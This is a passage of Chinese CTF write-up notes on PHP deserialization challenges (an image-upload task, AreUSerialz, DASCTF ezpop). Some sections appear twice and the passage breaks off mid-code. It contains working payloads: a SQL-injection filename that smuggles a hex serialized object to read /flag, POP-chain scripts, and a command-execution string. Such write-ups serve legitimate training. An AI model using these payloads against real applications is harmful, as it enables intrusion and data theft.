class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#获得文件各种信息</span></span><br><span class="line"><span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];<span class="comment">#原文件名</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">#随机名</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];<span class="comment">#后缀</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];<span class="comment">#路径</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#序列化存储文件的大小</span></span><br><span class="line"><span class="variable">$img_ext</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = <span class="title function_ invoke__">serialize</span>(<span class="variable">$my_ext</span>);</span><br><span class="line">    <span class="comment">#将文件信息插入到数据库中</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$array</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#getfile</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#随机名</span></span><br><span class="line"><span class="variable">$basename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">uniqid</span>()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="comment">#处理文件后缀名</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line"><span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#title=文件名</span></span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert_array</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">#处理文件各种信息</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$key_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$value_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line"><span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#insert插入文件各种信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>经过上面的代码审计可知，只对文件的后缀名作了处理，所以我们传参时能利用文件名即title</p><p>并且其将文件名保存到数据库中，就可能存在sql注入。</p><p><code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code></p><p>→<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p></blockquote></li><li><p>反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$attr_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line"><span class="variable">$attr</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$attr_temp</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只将attr进行反序列化</p><p>所以我们可以构造title使得attr为我们构造的序列化内容。</p><p><code>title=1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#</code></p><p><code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</code></p><p>→<code>INSERT INTO images(title,filename,ext,path,attr) VALUES(&#39; 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,payload)#&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)</code></p></blockquote></li><li><p>利用</p><p>help类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ifview == False)&#123;</span><br><span class="line"><span class="keyword">return</span> False;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谁调用了view_files</p><p>help类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">view_files</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>综上利用的属性</p><p>help-&gt;ifview &#x3D; True</p><p>help-&gt;config &#x3D; flag路径</p></blockquote><p>pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$ifview</span> = True; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">helper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;*ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;*config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>反序列化前<code>$attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);</code></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换为16进制 不能有引号</span></span><br><span class="line"><span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#`</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807140140896-1687419234886.png" alt="image-20220807140140896"></p><p><img src="/../images/image-20220807140151143-1687419234886.png" alt="image-20220807140151143"></p></li></ol><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="1-发现构造函数和反序列化函数知道考察序列化"><a href="#1-发现构造函数和反序列化函数知道考察序列化" class="headerlink" title="1.发现构造函数和反序列化函数知道考察序列化"></a>1.发现构造函数和反序列化函数知道考察序列化</h3><h3 id="2-代码审计得到大致流程"><a href="#2-代码审计得到大致流程" class="headerlink" title="2.代码审计得到大致流程"></a>2.代码审计得到大致流程</h3><p>传参str→is_valid()函数过滤→unserialize()函数触发destruct()函数：判断op→调用process()函数，op为2时→调用read()函数</p><h3 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">不修改属性，使用大S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="（1）op的值"><a href="#（1）op的值" class="headerlink" title="（1）op的值"></a>（1）op的值</h4><p>可以为’   2’和2来使destruct()中的不成立</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>绕过process()的</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="（2）成员改为public-x2F-使用大S"><a href="#（2）成员改为public-x2F-使用大S" class="headerlink" title="（2）成员改为public&#x2F;使用大S"></a>（2）成员改为public&#x2F;使用大S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.只允许可打印字符，而原先是protected类型，序列化以后会有不可打印字符%00</p><p>而查询得知在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p><p>2.protected属性序列化会引入\00<em>\00。但是\00是不可打印字符，所以我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。即手动将\00</em>\00变为\x00*\x00</p><h2 id="2022DASCTF-X-SU-三月春季挑战赛ezpop"><a href="#2022DASCTF-X-SU-三月春季挑战赛ezpop" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛ezpop"></a>2022DASCTF X SU 三月春季挑战赛ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()→what::<span class="title function_ invoke__">__tostring</span>()→mix::<span class="title function_ invoke__">__run</span>()→crow::<span class="title function_ invoke__">__invoke</span>()→fin::<span class="title function_ invoke__">__call</span>()→mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重复用到了fin-&gt;f1和min-&gt;m1，所以有$mix2 = new mix();$fin2 = new fin();</span></span><br><span class="line"><span class="variable">$fin</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php echo `ls`;?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$fin</span>);</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-青龙组-AreUSerialz-1"><a href="#网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="1-发现构造函数和反序列化函数知道考察序列化-1"><a href="#1-发现构造函数和反序列化函数知道考察序列化-1" class="headerlink" title="1.发现构造函数和反序列化函数知道考察序列化"></a>1.发现构造函数和反序列化函数知道考察序列化</h3><h3 id="2-代码审计得到大致流程-1"><a href="#2-代码审计得到大致流程-1" class="headerlink" title="2.代码审计得到大致流程"></a>2.代码审计得到大致流程</h3><p>传参str→is_valid()函数过滤→unserialize()函数触发destruct()函数：判断op→调用process()函数，op为2时→调用read()函数</p><h3 id="3-payload-1"><a href="#3-payload-1" class="headerlink" title="3.payload"></a>3.payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">不修改属性，使用大S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;S:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;S:<span class="number">7</span>:<span class="string">&quot;N;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="（1）op的值-1"><a href="#（1）op的值-1" class="headerlink" title="（1）op的值"></a>（1）op的值</h4><p>可以为’   2’和2来使destruct()中的不成立</p><p><img src="https://khaz.top/typora/images/image-20220403152704038.png" alt="image-20220403152704038"></p><p>绕过process()的</p><p><img src="https://khaz.top/typora/images/image-20220403152748861.png" alt="image-20220403152748861"></p><h4 id="（2）成员改为public-x2F-使用大S-1"><a href="#（2）成员改为public-x2F-使用大S-1" class="headerlink" title="（2）成员改为public&#x2F;使用大S"></a>（2）成员改为public&#x2F;使用大S</h4><p><img src="https://khaz.top/typora/images/image-20220403152827512.png" alt="image-20220403152827512"></p><p>1.只允许可打印字符，而原先是protected类型，序列化以后会有不可打印字符%00</p><p>而查询得知在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。</p><p>2.protected属性序列化会引入\00<em>\00。但是\00是不可打印字符，所以我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。即手动将\00</em>\00变为\x00*\x00</p><h2 id="2022DASCTF-X-SU-三月春季挑战赛ezpop-1"><a href="#2022DASCTF-X-SU-三月春季挑战赛ezpop-1" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛ezpop"></a>2022DASCTF X SU 三月春季挑战赛ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fin::<span class="title function_ invoke__">__destrcut</span>()→what::<span class="title function_ invoke__">__tostring</span>()→mix::<span class="title function_ invoke__">__run</span>()→crow::<span class="title function_ invoke__">__invoke</span>()→fin::<span class="title function_ invoke__">__call</span>()→mix::<span class="title function_ invoke__">__get_flag</span>()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 